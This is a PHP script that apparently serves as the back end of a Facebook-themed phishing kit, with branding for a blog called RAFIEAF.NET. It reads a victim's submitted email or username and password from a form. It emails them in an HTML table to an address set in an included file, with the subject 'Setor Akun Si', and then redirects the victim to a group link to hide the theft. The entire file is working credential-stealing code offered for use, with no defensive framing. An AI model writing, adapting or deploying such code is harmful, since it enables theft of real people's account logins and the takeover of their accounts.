<?php
include 'email.php';
$user = $_POST['email'];
$pass = $_POST['password'];
$linkgrup = $_POST['linkgrup'];
if(empty($linkgrup)) { header('location: /'); }
$subjek = "Setor Akun Si { ".$user." }";
$pesan = '
<center> 
<div style="padding:5px;width:294;height:40px;background: #222222;color: black;text-align:center;">
<img width="40" style="float:left;" src="https://image.ibb.co/ga9dZf/AGGYTOK.png">
<img width="40" style="float:right;" src="https://i.ibb.co/090sp3S/fb.png">
</div>
<table style="border-collapse:collapse;background:#ffc" width="100%" border="1">
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
  <th style="width:78%;text-align: center;"><b>'.$user.'</th> 
 </tr>
 <tr>
  <th style="width:22%;text-align:left;" height="25px"><b>PASSWORD</th>
  <th style="width:78%;text-align: center;"><b>'.$pass.'</th> 
 </tr>
 </table>
<div style="padding:5px;width:294;height:40px;background: #222222;color:#ffc;text-align:center;">
<font size="3"><b>Blog RAFIEAF.NET</b></font>
</div>
</center>
';
$headersx  = 'MIME-Version: 1.0' . "\r\n";
$headersx .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headersx .= 'From: RAFIEAF.NET <result@arpantek.com>' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headersx);
?>
<script>document.location='<?php echo $linkgrup;?>';</script>